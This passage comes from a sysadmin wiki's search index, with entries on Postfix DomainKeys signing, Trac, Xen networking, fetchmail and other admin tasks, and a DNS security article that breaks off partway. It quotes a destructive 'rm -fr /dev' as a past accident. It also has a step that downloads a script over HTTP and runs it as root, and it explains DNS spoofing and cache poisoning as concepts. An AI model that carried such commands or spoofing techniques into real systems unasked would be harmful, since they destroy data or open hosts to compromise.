                content: "Introduction linkDomainKeys is an anti-spam software application in development at Yahoo that uses a form of public key cryptography to authenticate the sender’s domain. dkfilter is an SMTP-proxy designed for Postfix. It implements DomainKeys message signing and verification. It comprises two separate filters, an “outbound” filter for signing outgoing email on port 587, and an “inbound” filter for verifying signatures of incoming email on port 25. This document is to describe step by step how to install dkfilter for postfix to deploy domainkeys signing and verification.\n+------+ |verify| (verify) +--+---+ SpamAssassin ^ ^v incoming: | +----++-----+ MX ----\u003e 25 smtpd ---\u003e 10024 \u003e \u003e--\u003e 10025 smtpd --\u003e submission: | | SASL --\u003e 25 smtpd \\ | amavisd | +-\u003e | | mynets-\u003e 25 smtpd ---\u003e 10026 \u003eORIGINATING\u003e--\u003e 10027 smtpd --\u003e --\u003e 587 smtpd ---\u003e +-----------+ | (convert to 7-bit) v +----+ |sign| +----+ Installation linkPostfix linkInstall postfix for your domain to send and receive mails with this doc:\nInstallation and Configuration of Postfix and Courier\nCPAN Perl modules linkDkfilter is written in Perl. It requires the following Perl Modules from CPAN archive.\nCrypt::OpenSSL::RSA Mail::Address MIME::Base64 Net::DNS Test::More Text::Wrap Mail::DomainKeys Following commands would help:\nperl -MCPAN -e'CPAN::Shell-\u003einstall(\"Crypt::OpenSSL::RSA\")' perl -MCPAN -e'CPAN::Shell-\u003einstall(\"Mail::Address\")' perl -MCPAN -e'CPAN::Shell-\u003einstall(\"MIME::Base64\")' perl -MCPAN -e'CPAN::Shell-\u003einstall(\"Net::DNS\")' perl -MCPAN -e'CPAN::Shell-\u003einstall(\"Test::More\")' perl -MCPAN -e'CPAN::Shell-\u003einstall(\"Text::Wrap\")' perl -MCPAN -e'CPAN::Shell-\u003einstall(\"Email::Address\")' perl -MCPAN -e'CPAN::Shell-\u003einstall(\"Mail::DomainKeys\")' Note: Also resolve any dependent Perl Module required in installing the above Perl modules.\nDkfilter linkThe following steps are recommended for installing dkfilter.\nDownload linkDownload dkfilter from following URL:\nwget http://jason.long.name/dkfilter/dkfilter-0.11.tar.gz Installation linkInstalling dkfilter:\ntar xvf dkfilter-0.11.tar.gz cd dkfilter-0.11 ./configure --prefix=/usr/local/dkfilter make install useradd dkfilter The filter scripts will be installed in /usr/local/dkfilter/bin and the Perl module files will be in /usr/local/dkfilter/lib.\nConfiguration linkInbound Filter linkWe need to make relevant changes inside Postfix configuration files to check incoming mails for the signature.\nEdit the Postfix master.cf file:\nvi /etc/postfix/master.cf Add this configuration:\n# Dkfilter Inbound Part1 smtp inet n - n - - smtpd -o smtpd_proxy_filter=127.0.0.1:10029 -o smtpd_client_connection_count_limit=10 ### Amavis filter ### amavis unix - - n - 2 smtp -o smtp_data_done_timeout=1200 -o disable_dns_lookups=yes 127.0.0.1:10025 inet n - n - - smtpd -o content_filter= -o local_recipient_maps= -o relay_recipient_maps= -o smtpd_restriction_classes= -o smtpd_client_restrictions= -o smtpd_helo_restrictions= -o smtpd_sender_restrictions= -o smtpd_recipient_restrictions=permit_mynetworks,reject -o mynetworks=127.0.0.0/8 -o strict_rfc821_envelopes=yes ### End of Amavis Filter ### # Dkfilter Inbound Part2 127.0.0.1:10026 inet n - n - - smtpd -o smtpd_authorized_xforward_hosts=127.0.0.0/8 -o smtpd_client_restrictions= -o smtpd_helo_restrictions= -o smtpd_sender_restrictions= -o smtpd_recipient_restrictions=permit_mynetworks,reject -o smtpd_data_restrictions= -o mynetworks=127.0.0.0/8 -o receive_override_options=no_unknown_recipient_checks Insert above lines at the end of the file. Here we define that mail will be received after smtp for verification on 127.0.0.1 with port 10026. You can define your own desired IP address on which you want to listen for signature checking.\nOutbound filter linkThe outbound filter needs access to the private key used for signing messages. In addition, it needs to know the name of the key selector being used, and what domain it should sign messages for. This information is specified with command-line arguments to dkfilter.out.\nKey pair link Generate a private/public key pair and publish the public key in DNS: cd /usr/local/dkfilter openssl genrsa -out private.key 1024 openssl rsa -in private.key -pubout -out public.key This creates the files private.key and public.key in the current directory, containing the private key and public key. Make sure private.key is not world-readable, but still readable by the dkfilter user.\nPick a selector name… e.g. m1 Bind link Put the public-key data in DNS, in your domain, using the selector name you picked. Copy the contents of the public.key file and remove the PEM header and footer, and paste it in dns zone file by creating a TXT entry, like this: _deimos.fr TXT \"t=y; o=-;\" m1._deimos.fr TXT \"g=; k=rsa; p=MIGxm...MeQIDAQAB;\" where m1 is the name of the selector chosen in the last step and the p= parameter contains the public-key as one long string of characters.\nPostfix linkFinally, configure Postfix to filter outgoing, authorized messages only through the dkfilter.out service on port 10027. In the following example, messages sent via SMTP on port 587 (the submission port) will go through an After-Queue content filter that signs messages with DomainKeys.\nvi /etc/postfix/master.cf Add this configuration:\nsubmission inet n - n - - smtpd -o smtpd_etrn_restrictions=reject -o smtpd_sasl_auth_enable=yes -o content_filter=dksign:[127.0.0.1]:10027 -o receive_override_options=no_address_mappings -o smtpd_recipient_restrictions=permit_mynetworks,permit_sasl_authenticated,reject dksign unix - - n - 10 smtp -o smtp_send_xforward_command=yes -o smtp_discard_ehlo_keywords=8bitmime 127.0.0.1:10028 inet n - n - 10 smtpd -o content_filter= -o receive_override_options=no_unknown_recipient_checks,no_header_body_checks -o smtpd_helo_restrictions= -o smtpd_client_restrictions= -o smtpd_sender_restrictions= -o smtpd_recipient_restrictions=permit_mynetworks,reject -o mynetworks=127.0.0.0/8 -o smtpd_authorized_xforward_hosts=127.0.0.0/8 Execute postfix reload for Postfix to respond to changes in /etc/postfix/master.cf:\npostfix reload Start / Stop script linkThis is the startup/shutdown script:\n#!/bin/sh # # Copyright (c) 2005 Messiah College. # Modified by Pierre Mavro DKFILTERUSER=dkfilter DKFILTERGROUP=dkfilter DKFILTERDIR=/usr/local/dkfilter HOSTNAME=`hostname -f` DOMAIN=`hostname -d` DKFILTER_IN_ARGS=\"--hostname=$HOSTNAME 127.0.0.1:10029 127.0.0.1:10026\" DKFILTER_OUT_ARGS=\"--keyfile=$DKFILTERDIR/private.key --selector=postfix --domain=$DOMAIN --method=nofws --headers 127.0.0.1:10027 127.0.0.1:10028\" DKFILTER_IN_BIN=\"$DKFILTERDIR/bin/dkfilter.in\" DKFILTER_OUT_BIN=\"$DKFILTERDIR/bin/dkfilter.out\" PIDDKFILTER_IN=\"/var/run/dkfilter.in\" PIDDKFILTER_OUT=\"/var/run/dkfilter.out\" case \"$1\" in start) echo -n \"Starting inbound DomainKeys-filter (dkfilter.in)...\" start-stop-daemon --start -q -p$PIDDKFILTER_IN -u $DKFILTERUSER -g $DKFILTERGROUP -x `$DKFILTER_IN_BIN $DKFILTER_IN_ARGS` \u0026 RETVAL=$? if [ $RETVAL -eq 0 ]; then echo done. else echo failed. exit $RETVAL fi echo -n \"Starting outbound DomainKeys-filter (dkfilter.out)...\" start-stop-daemon --start -q -p $PIDDKFILTER_OUT -u $DKFILTERUSER -g $DKFILTERGROUP -x `$DKFILTER_OUT_BIN $DKFILTER_OUT_ARGS` \u0026 RETVAL=$? if [ $RETVAL -eq 0 ]; then echo done. else echo failed. exit $RETVAL fi ;; stop) echo -n \"Shutting down inbound DomainKeys-filter (dkfilter.in)...\" start-stop-daemon --stop -p $PIDDKFILTER_IN RETVAL=$? if [ $RETVAL -eq 0 ]; then echo done. else echo failed. fi echo -n \"Shutting down outbound DomainKeys-filter (dkfilter.out)...\" start-stop-daemon --stop -p $PIDDKFILTER_OUT RETVAL=$? if [ $RETVAL -eq 0 ]; then echo done. else echo failed. exit $RETVAL fi ;; restart) $0 stop $0 start ;; *) echo \"Usage: $0 {start|stop|restart}\" exit 1 ;; esac Copy that script in /etc/rc.d/init.d (Red Hat System) or /etc/init.d (Debian System) and edit it as per your requirement.\nThen add the proper permissions:\nchmod 755 /etc/init.d/dkfilter You can also use this command on Debian:\nupdate-rc.d dkfilter defaults Resources linkSet Up Postfix DKIM With dkim-milter\n"
            }
        );
    index.add(
            {
                id:  689 ,
                href: "\/Trac_:_Mise_en_place_d\u0027une_solution_de_Tracking\/",
                title: "Trac: Setting up a Tracking Solution",
                description: "A guide for setting up Trac, a web-based wiki and issue tracking system that integrates with Subversion for project management.",
                content: "Introduction linkTrac is a wiki with tracking capabilities in a web environment. It works with Subversion and manages tickets. It also has many other very practical features to discover.\nYou need to install Subversion (SVN) first. Only then can you use Trac.\nInstallation linkInstalling Trac is quite straightforward:\naptitude install trac enscript python-docutils libapache2-mod-python Creating a Trac Project linkI place my various Trac instances in ~/trac. Run the following commands to create the Trac environment:\nmkdir ~/trac cd trac trac-admin project initenv And answer the few questions asked:\nProject Name [My Project]\u003e Project Database connection string [sqlite:db/trac.db]\u003e press enter to validate Repository type [svn]\u003e press enter to validate Path to repository [/var/svn/test]\u003e /root/svn/project Templates directory [/usr/share/trac/templates]\u003e press enter to validate Apache2 Configuration linkNow that the Trac project has been created, Apache needs to be configured to make it accessible. Edit your virtualhost file and add the following:\nAlias /trac \"/usr/share/trac/htdocs\" ScriptAlias /projet /usr/share/trac/cgi-bin/trac.cgi SetEnv TRAC_ENV \"/root/trac/projet\" File Permission Modifications linkTo make the files accessible by Apache, you need to modify the permissions, similar to what was done for the Subversion repository:\ncd ~/trac chown -R www-data:www-data projet chmod 775 projet -R Creating Trac Users linkTo connect to Trac, you need to create Trac users. Like for Subversion users, we use the htpasswd2 command:\ncd /etc/apache2 htpasswd -cm dav_svn.passwd pmavro New password:******** Re-type new password:******** Adding password for user pmavro And to add another user:\nhtpasswd -m dav_svn.passwd anonymous New password: Re-type new password: Adding password for user anonymous You need to edit your virtualhost file again and add the following lines:\nAuthType Basic AuthName \"Trac: login\" AuthUserFile /etc/apache2/dav_svn.passwd Require valid-user Finalization linkTo finish, let’s add some security to the files containing passwords:\ncd /var/www/trac chown www-data:www-data * chmod go-rwx * Resources linkDocumentation on setting up Subversion and Trac\n"
            }
        );
    index.add(
            {
                id:  690 ,
                href: "\/Vlogger_:_Splitter_les_logs_de_Lighttpd_avec_creation_de_statistiques\/",
                title: "Vlogger: Splitting Lighttpd logs with statistics generation",
                description: "Documentation on how to segment Lighttpd logs and create statistics using Webalizer",
                content: "Here is documentation on log segmentation for Lighttpd with statistics creation using Webalizer:\nDocumentation on Splitting lighttpd Logs With vlogger And Creating Statistics With Webalizer\n"
            }
        );
    index.add(
            {
                id:  691 ,
                href: "\/Xen_avec_Bonding_\u002b_Vlan_Tagging\/",
                title: "Xen with Bonding + VLAN Tagging",
                description: "This guide explains how to configure Xen with network bonding and VLAN tagging to maximize ethernet interfaces usage with fault tolerance and load balancing.",
                content: "Introduction linkAs powerful and flexible as it may be, Xen’s network configuration often feels like an obstacle course as soon as you stray a bit from the beaten path.\nRecently, I had to set up a Xen-based solution in a somewhat special network topology. Each server where Xen was deployed had 2 ethernet adapters, each with 2 gigabit ethernet interfaces. The goal was to maximize the use of the different ethernet interfaces while providing both fault tolerance and load balancing. To make things even more interesting, the network was segmented into VLANs, each VLAN segmenting the network by function (DMZ, LAN, ADMIN, etc.).\nThe different points that interest us here at the system administration level are:\nChannel Bonding VLAN Tagging Bridging After some research on the web, you quickly realize that you will need to create your own network script for Xen. Shame on me, I didn’t really feel capable of doing that (too complicated/I don’t know python/it’s still too obscure for me). So I decided to move the problem from Xen to the host operating system, with most of the configuration happening at the OS level (in this case a Debian Etch), with Xen simply using what already exists.\nThe final goal is as follows:\nDon’t worry about bond0, we’re only interested in bond1, eth1, and eth2 here.\nChannel Bonding Configuration linkFirst, we need to configure and load the bonding module. In Debian, go to /etc/modprobe.d/arch/i386 (even if you’re on an x86_64 architecture):\n# Channel bonding configuration # # mode=802.3ad # Use 802.3ad for link aggregation (require LACP compatible switch and # additionnal switch configurations) # miimon= 100 # MII monitoring frequency in ms # use_carrier=0 # Use an alternative and deprecated method (ethtool ioctls) to monitor # link status. Works better with this mode (maybe network drivers issues) # lacp_rate=fast # Transmit LACPDU packet each second instead of each 30 seconds # max_bonds=2 # Indicate that there's 2 bonding device (bond0 and bond1) even if # only bond0 is explicitely configured. With max_bonds options there's # no way to configure separately each bond device. # NOTE : -o bond# (better) seems not to be supported alias bond0 bonding options bond0 mode=802.3ad miimon=100 use_carrier=0 lacp_rate=fast max_bonds=2 Yes, I know I’m only specifying the configuration for bond0 here. However, by changing the value of max_bonds, you configure the number of interfaces you want. Despite what is specified in the bonding.txt.gz file of the Linux documentation (aptitude install linux-doc), I was not able to have a per-interface configuration. The kernel is the default one provided with Debian Etch.\nConfiguration of the bond1 Interface linkNext, we need to edit the /etc/network/interfaces file as follows:\niface bond1 inet manual pre-up /sbin/ifconfig eth0 up pre-up /sbin/ifconfig eth3 up pre-up /sbin/ifconfig bond1 up pre-up /sbin/ifenslave bond1 eth0 pre-up /sbin/ifenslave bond1 eth3 post-down /sbin/ifenslave -d bond1 eth3 post-down /sbin/ifenslave -d bond1 eth0 post-down /sbin/ifconfig eth0 down post-down /sbin/ifconfig eth3 down post-down /sbin/ifconfig bond1 down Nothing too complicated here. Note a few things though:\nYou need to install the ifenslave-2.6 package. I use the pre-up directive instead of up which is more commonly found. I had some weird behaviors with the latter (like interfaces not coming up). No IP configuration is specified. We’re staying at layer 2 of the OSI model. At this point, you can start playing with bringing your bond1 interface up and down:\nifup bond1 ifdown bond1 VLAN linkOn top of this bond1 interface, we’ll now set up one interface per VLAN. First, you need to install the vlan package:\n# vlan 3 = LAN iface vlan3 inet manual vlan-raw-device bond1 pre-up /sbin/ifup bond1 pre-up /sbin/ifconfig bond1 up pre-up /sbin/modprobe 8021q # vlan 2 = DMZ iface vlan2 inet manual vlan-raw-device bond1 pre-up /sbin/ifup bond1 pre-up /sbin/ifconfig bond1 up pre-up /sbin/modprobe 8021q Note again the use of the pre-up directive (it’s really the only one that worked for me) and the loading of the module handling VLAN (802.1Q standard).\nCreating Bridges for DomUs linkFirst, it’s important to understand that a software bridge under Linux works exactly the same way as a physical switch. In everyday life (of an IT person), what we’re doing here is equivalent to:\nTaking a switch Plugging network cables into it Obviously, each cable is connected to a computer In my particular case, I need to create 2 bridges: one over the DMZ VLAN, the other over the LAN VLAN:\n# xen bridge for hosts which needs LAN network auto xenbrlan iface xenbrlan inet dhcp pre-up /sbin/ifup vlan3 pre-up /sbin/ifconfig vlan3 up pre-up /usr/sbin/brctl addbr xenbrlan pre-up /usr/sbin/brctl addif xenbrlan vlan3 pre-up /usr/sbin/brctl setfd xenbrlan 0 post-down /usr/sbin/brctl delif xenbrlan vlan3 post-down /usr/sbin/brctl delbr xenbrlan post-down /sbin/ifdown vlan3 # xen bridge for hosts which needs DMZ network auto xenbrdmz iface xenbrdmz inet manual pre-up /sbin/ifup vlan2 pre-up /sbin/ifconfig vlan2 up pre-up /usr/sbin/brctl addbr xenbrdmz pre-up /usr/sbin/brctl addif xenbrdmz vlan2 pre-up /usr/sbin/brctl setfd xenbrdmz 0 post-down /usr/sbin/brctl delif xenbrdmz vlan2 post-down /usr/sbin/brctl delbr xenbrdmz post-down /sbin/ifdown vlan2 Note that like any respectable switch, our xenbrlan and xenbrdmz bridges don’t need an IP address (it’s a layer 2 device) to function. At this point, you can play with bringing your bridges up and down on the fly:\nifup xenbrlan xenbrdmz ifdown xenbrlan xenbrdmz Configuring Xen linkThe only small difficulty here is to create a little script that will allow the use of 2 different bridges. To do this, we’ll create a file /etc/xen/script/my-network-bridge as follows:\n#!/bin/sh dir=$(dirname \"$0\") \"$dir/network-bridge\" \"$@\" vifnum=0 bridge=xenbrlan \"$dir/network-bridge\" \"$@\" vifnum=1 bridge=xenbrdmz You’ll also need to tell Xen to use our script instead of the default one. To do this, go to the xend-config.sxp file and replace (network-script network-bridge) with (network-script 'my-network-bridge').\nAll that’s left is to specify in the configuration of each DomU the bridge you want to use:\nvif = ['mac=02:00:00:00:00:01, bridge=xenbrdmz'] You can now start your VMs :-)\nResources linkhttps://anothergeekwebsite.com/fr/2007/06/xen-vlan-et-bonding-oui-oui-tout-ca\n"
            }
        );
    index.add(
            {
                id:  692 ,
                href: "\/activer-le-pave-numerique\/",
                title: "Activating the Numeric Keypad",
                description: "How to enable the numeric keypad by default in console mode and in X Window System.",
                content: "To have the numlock activated in console and under X:\nIn console mode: echo \"LEDS=+num\" \u003e\u003e /etc/console-tools/config In X Window System: apt-get install numlockx "
            }
        );
    index.add(
            {
                id:  693 ,
                href: "\/Les_Flags_TCP\/",
                title: "TCP Flags",
                description: "A reference guide explaining the meaning of different TCP flags used in network communications.",
                content: "TCP Flags Explained linkIf you’re not used to analyzing network packet behavior, it’s easy to forget what certain TCP flag abbreviations mean:\nFIN - Finish; end of session SYN - Synchronize; indicates request to start session RST - Reset; drop a connection PUSH - Push; packet is sent immediately ACK - Acknowledgement URG - Urgent ECE - Explicit Congestion Notification Echo CWR - Congestion Window Reduced "
            }
        );
    index.add(
            {
                id:  694 ,
                href: "\/R%C3%A9cup%C3%A9rer_son_OpenBSD_apr%C3%A8s_une_mauvaise_manip\/",
                title: "Recovering your OpenBSD after a bad manipulation",
                description: "Guide on how to recover an OpenBSD system after accidentally deleting the /dev directory",
                content: "1. Concrete case linkWhile manipulating my external partitions, I accidentally executed:\n# rm -fr /dev At boot time I get:\n\"/dev/console not found\" How to fix this problem?\n2. Solutions link A simple method with minimal manipulation is to boot from a ramdisk (your /bsd.rd file that you should have, or an installation CD) and perform an Upgrade.\nThis won’t overwrite your configuration files, just the files provided in the base system excluding etc42.tgz and xetc42.tgz.\nIf you want to do it manually, boot from the ramdisk, mount your root partition, recreate the dev directory, copy the MAKEDEV script inside (script that you’ll find in /usr/src/etc/etc./MAKEDEV, or in base42.tgz) and execute:\ncd dev \u0026\u0026 sh MAKEDEV all Alternatively, boot from the CD, then choose shell (install, upgrade or shell). Execute /dev/MAKEDEV all (Retrieve the MAKEDEV script for your version) "
            }
        );
    index.add(
            {
                id:  695 ,
                href: "\/Postsuper_:_Suppression_massive_de_mails_dans_la_queue\/",
                title: "Postsuper: Mass Deletion of Emails in the Queue",
                description: "Guide to removing emails from Postfix queue, both complete and selective deletions using postsuper utility.",
                content: "Introduction linkPostsuper is a Postfix utility that allows you to delete emails in the queue. I needed it to delete around 40,000 emails that were error messages from the MAILER-DAEMON user, with approximately 300 emails in the batch that needed to be delivered.\nComplete Deletion linkTo delete all emails in the queue:\npostsuper -d ALL Partial Deletion linkTo delete all emails from the MAILER-DAEMON user, here’s the script (replace MAILER-DAEMON with another name if needed):\n#!/bin/sh supp=`mailq | grep MAILER-DAEMON | awk -F\"*\" '{ print $1 }'` for i in $supp ; do postsuper -d $i done Or alternatively, here’s another example:\nmailq | tail +2 | awk 'BEGIN { RS = \"\" } / user@mydomain\\.com$/ { print $1 }' | tr -d '*!' | postsuper -d - "
            }
        );
    index.add(
            {
                id:  696 ,
                href: "\/Securiser_OpenSSH\/",
                title: "Securing OpenSSH",
                description: "Documentation and resources for securing OpenSSH servers",
                content: "Here is documentation to secure your OpenSSH server:\nSecuring OpenSSH Server - Part 1\n"
            }
        );
    index.add(
            {
                id:  697 ,
                href: "\/fetchmail-the-ultimate-mail-collector\/",
                title: "Fetchmail - The Ultimate Mail Collector",
                description: "How to set up Fetchmail to retrieve emails from multiple accounts and consolidate them in one place",
                content: "Introduction linkFetchmail is an IMAP, POP2, POP3, etc. collector.\nIt allows you to retrieve emails from different mailboxes and consolidate them in your personal mailbox.\nInstallation linkFor installation, the usual steps:\napt-get install fetchmail Configuration linkFor a single user linkLet’s create a .fetchmailrc file in our home directory:\ntouch ~/.fetchmailrc And insert these lines (for POP3):\npoll pop.myprovider.com with proto POP3 user 'address@email.com' there with password 'PASSWORD' is 'USER' here options fetchall For multiple users linkIf you want to create a file that will fetch (yes, the verb 😉) emails for multiple users with a single file, create the file “/etc/fetchmailrc” and insert lines like this:\npoll pop.myprovider.com proto pop3 port 995 user 'username' password 'password' smtpname \"unixuser\" options fetchall ssl Here the POP3 is with SSL, which is why we have the “ssl” option at the end.\nLaunch linkBefore doing anything, let’s just test if the current configuration works:\nfetchmail -c Now that everything is good, let’s retrieve our emails:\nfetchmail 1 message for USER at pop.myprovider.com (1801 bytes). reading message address@email.com:1 of 1 (1801 bytes) . deleted FAQ linkmail forwarding loop linkIf you encounter this type of message, and have a line like this:\nJan 7 15:40:25 fire postfix/local[24131]: 0AE56422D0: to=, orig_to=, relay=local, delay=0.1,delays=0.07/0.01/0/0.02, dsn=5.4.6, status=bounced (mail forwarding loop for xxx@mycompany.com) You need to add the “dropdelivered” option configured like this:\npoll x.x.x.x proto pop3 port 995 user 'pmavro' password 'xxx' dropdelivered smtpname \"pierre.mavro\" options fetchall ssl Resources linkFetchmail Documentation\n"
            }
        );
    index.add(
            {
                id:  698 ,
                href: "\/Modifier_le_firmware_par_le_FrancoFON\/",
                title: "Modify the firmware with FrancoFON",
                description: "Guide to modify your Fonera firmware using FrancoFON to add enhanced functionality including improved firewall management, port redirection, and more advanced networking options.",
                content: "Introduction linkI’d like to modify the original firmware to have more functionality. That’s why I opted for this firmware. Unfortunately, at the time of writing this article, it’s not possible to run this firmware on a Fonera+. Here’s what it adds compared to the base firmware:\nImproved firewall management Simplified port redirection DHCP address management for the private network Blacklisting of certain sites for the public network Adding/removing DNS Antenna power adjustment Remote reboot Management of dyndns accounts Hosts file management Live view of connections to private and public networks Comparison of the Fonera version with the latest available version Hidden SSID management for the private network Language management (English, French, Romanian for now) Ability to update firmware from a server other than the FrancoFON server Ability to configure the Fonera in pppoe with the @ and / characters required by some ISPs, up to 64 characters Opening/closing SSH Opening/closing console access via ethernet Script to know the number of Foneras using the FrancoFON firmware Ability to block clients on public and private signals by MAC address with scheduler Ability to connect the Fonera to a WiFi AP to use its internet connection (autonomous “Fonera mode”, also called “Ponte2”) Prerequisites linkYou must have SSH installed on your Fonera. Use this documentation: Enable SSH on your Fonera+\nInstallation of the new firmware linkConnect to your Fonera via WiFi, then via SSH:\nssh root@192.168.10.1 The default root password is “admin” or the Fonera management password you defined on the website.\nThen, let’s start the installation:\ncd /tmp wget http://download.francofon.fr/update.sh chmod +x update.sh sh ./update.sh The Fonera will then update:\n***************************************************** * Script D'installation du firmware FrancoFON * ***************************************************** Auteurs : FrancoFON.FR Version : 1.2 Contact : webmaster@francofon.fr ***************************************************** Le fichier contenant le firmware FrancoFON va être téléchargé Le fichier a correctement ete telecharge La decompression va commencer. Le processus peut être long. Desarchivage en cours...... and the Fonera will reboot.\nFAQ linkI have too many problems, I want to restore factory settings link Unplug the network cable and power from the Fonera. Locate the reset button by turning the Fonera over. Press the “Reset” button and hold it. Reconnect the power without releasing the button. Hold the button for at least 45 seconds. Wait until the WLAN light turns on. Press the reset button again for 10 seconds then release. Wait until the WLAN light turns on. Check via the console that the Fonera has returned to its factory settings. Resources linkhttp://www.francofon.fr/modules/mediawiki/index.php/Le_firmware_FrancoFON http://www.francofon.fr/modules/mediawiki/index.php/La_Fonera/Reset\n"
            }
        );
    index.add(
            {
                id:  699 ,
                href: "\/AvantFax_:_Mise_en_place_d\u0027un_serveur_de_Fax_HylaFax_avec_AvantFax\/",
                title: "AvantFax: Setting Up a HylaFax Server with AvantFax",
                description: "Learn how to set up a fax server using HylaFax with the AvantFax web frontend.",
                content: "Here is a small guide to set up HylaFax with the AvantFax web frontend:\nDocumentation on how to Build a HylaFax Server with AvantFax Frontend\n"
            }
        );
    index.add(
            {
                id:  700 ,
                href: "\/Audits_de_s%C3%A9curit%C3%A9_du_protocole_DNS\/",
                title: "DNS Protocol Security Audits",
                description: "Learn about DNS protocol security audits, methods to identify vulnerabilities, and how to use the DNSA tool for testing DNS servers.",
                content: "Introduction to DNS Protocol Security linkDNS is used in most local networks; however, it was developed with strong performance constraints at the expense of security, to avoid degrading regular traffic due to the substantial number of queries associated with the nature of this protocol.\nDNS (Domain Naming System) is one of the key protocols of the Internet, along with several major routing protocols, notably BGPv4 (Border Gateway Protocol). It is also used in most current local networks with, depending on the chosen topology, one or more internal DNS server(s).\nThis older protocol was not developed with strong security constraints, but mainly performance constraints. The criterion at that time was optimizing performance that would generally not degrade traffic due to the high frequency of these requests.\nAs DNS is at the center of all IP communications (how could the Internet work today without name resolution?), it represents a pillar of communications and is therefore a prime target for attackers wishing to divert traffic to listen to it, modify it, or directly inject into it.\nDNS, in its original version - which is still the most commonly used - has several intrinsic flaws that cannot be fixed unless using DNSSec or combining different security layers at several different levels (IPSec, etc.).\nHowever, it is possible to considerably limit the risks by adapting the network topology (Local Area Network, demilitarized zone DMZ, etc.). Secondary DNS servers (updated with the famous “zone transfers”) can also be the target of attacks aimed at a particular network.\nMost DNS transactions take place on port 53/UDP, except for queries that are too large or zone transfers that go through port 53/TCP. Throughout this article, the attacks and countermeasures described almost exclusively concern UDP packets of DNS traffic.\nDNSA (DNS Auditing tool) is a “swiss army knife” of security from the perspective of name resolution. It can be used in conjunction with a vulnerability scanner to identify different DNS servers (primary and secondary), identify server types and versions, etc.\nTools such as DIG (Domain Information Groper), host, or nslookup allow interactive querying of DNS servers and thus collect a lot of information that will then be useful for processing with DNSA.\nHighlighting DNS Vulnerabilities linkDNS vulnerabilities can be exploited through DNS ID Spoofing attacks and intrinsic conceptual attacks on the DNS protocol. The attacks in this paper are based on spoofing to execute privilege escalation; the Cache Poisoning attack example concerns the corruption of the “additional record” field.\nThe DNS flaws addressed in this article are all implemented in the DNSA tool. For DNS ID Spoofing attacks, these are conceptual attacks intrinsic to the DNS protocol. As with all so-called “Spoofing” attacks, the goal is to impersonate a third party in order to gain additional privileges.\nIn all the attacks presented below, “spoofing” is used so that the machine running DNSA passes for the legitimate DNS server being queried. For the DNS Cache Poisoning attack (DNS cache corruption), the one retained in the DNSA tool is the corruption of the “additional record” field.\nCapturing a Standard and Reverse DNS Query link root@linbox]# tcpdump -i eth0 udp and port 53 tcpdump: listening on ath0 linbox.32783 \u003e ns1.fai.fr.domain: 30679+ A? www.google.fr. (30) (DF) ns1.fai.fr.domain \u003e linbox.32783: 30679 2/5/1 CNAME[|domain] (DF) ns1.fai.fr.domain \u003e linbox.32784: 25190* 1/4/4 (224) (DF) linbox.32785 \u003e ns1.fai.fr.domain: 30680+ PTR? 99.9.102.66.in-addr.arpa. (42) (DF) A standard DNS query is a type A query. A is a hostname, CNAME an alias, MX a mail server, etc… It is also possible to perform reverse queries with PTR records to find out the hostname of a machine from its IP.\nDNS ID Spoofing linkThe DNS ID Spoofing attack primarily uses:\nThe weaknesses of the UDP protocol, which ensures no integrity or packet tracking. Traffic injections are therefore possible without having prior information; Knowledge or low randomness of the DNS ID, the only information encoded on 16 bits, or 65,535 possible combinations, allowing the recognition of the response to a sent query. In the case of a known DNS ID (same Ethernet segment, DMZ compromise, etc.), the DNS ID Spoofing attack is trivial by using the information retrieved from listening to DNS traffic and then forging the response as it would have been sent by the legitimate server. For an unknown DNS ID (typical Internet case with 2 remote clients for example), attacks are possible by reducing the window of possible DNS IDs in the case of low randomness with so-called prediction attacks. Such attacks have already been implemented on TCP sequence numbers (p0f, the passive OS recognition tool using this technique) and can be extended to the DNS case. DNS ID of a DNS Transaction linkIn a typical attack, considering that the DNS ID can be retrieved by passive traffic listening, the principle is simple:\nThe attacker is listening for DNS queries When the query to be diverted is issued, it extracts the DNS ID It then forges an adequate response with an IP/UDP/DNS packet having the necessary payload, that is, containing the source IP of the legitimate DNS server, the destination IP of the client that issued the query, the DNS ID recovered above, and the information it wishes to insert. All the “engines” of current operating systems’ name resolution work the same way: they take into account the first response to a query made and then ignore subsequent responses. This is the case here: DNSA responding before the legitimate name server (because it is optimized to respond very quickly thanks to the libpcap call-back functions), the legitimate server’s query is then ignored.\nDNS ID Spoofing Attack on a DNS Server linkSince a DNS server can behave like a client when it doesn’t have the information in cache, it can be diverted in the same way as a classic client with a DNS ID Spoofing attack. The necessary (and sufficient!) condition for the attack to be carried out is to be placed on the same Ethernet segment as the attacked server.\nSeveral scenarios are possible (compromising a DMZ machine, a LAN client…). Detailed examples were presented at the 2005 Symposium on Security of Information and Communication Technologies and Systems…\nDNS Cache Poisoning linkWhen a client queries its name server, if it has the information in cache (“host www.hote.com is available at IP address x.x.x.x”), it responds directly. Otherwise, the server behaves like a standard client to query the DNS server responsible for the domain.\nThis then responds with the requested information, and can, if configured to do so, include additional records (addRR) to avoid an overload of future queries. This “option” was first integrated without checking the domains registered in additional records.\nA server could therefore respond by including addRRs that did not concern the domain for which it was responding. Flow diversion is then possible: a server controlled by a malicious user could, for example, return an additional record concerning the domain microsoft.com and thus making it point to the machine of his choice.\nPayload of a DNS Packet link Byte |---------------|---------------|---------------|---------------| 1 2 3 4 ID (cont) QR,OP,AA,TC,RD RA,0,AD,CD,CODE |---------------|---------------|---------------|---------------| 4 # Questions 5 (Cont) 6 # Answers 7 (Cont) |---------------|---------------|---------------|---------------| 8 # Authority 9 (Cont) 10 # Additional 11 (Cont) |---------------|---------------|---------------|---------------| Question Section |---------------|---------------|---------------|---------------| Answer Section |---------------|---------------|---------------|---------------| Authority Section |---------------|---------------|---------------|---------------| Additional Section addRR Field |---------------|---------------|---------------|---------------| The payload of a DNS packet (here after the IP and then UDP headers) consists of different fields:\nThe transaction ID (DNS ID), a 2-byte field. Various “flags” set to define the type of DNS packet: query, response, etc… The number of “questions” asked. The number of “answers” given. The questions The answers. The name servers (NS for Name Server) responsible for the zone. The famous additional field in which various complementary information can be provided. Installation and Configuration of DNSA linkdnsa-ng-0.6 uses the libnet-ng and libpcap libraries, which should be pre-installed preferably with the development versions to have the most recent header files. Also find explanations and details on the low-level functioning of the DNSA tool (DNS Auditing Tool).\nDNSA is available on the securitech.homeunix.org site in tar.gz archive format. It uses the libnet libraries (libnet-ng in its recent versions) and libpcap, which must be installed beforehand.\nThe installation details will focus on the latest version: dnsa-ng-0.6.\nThe installation of libpcap can be done, on the vast majority of architectures/distributions, via packages (deb, rpm, …).\nHowever, make sure to install the development version (generally, depending on the distributions, suffixed by 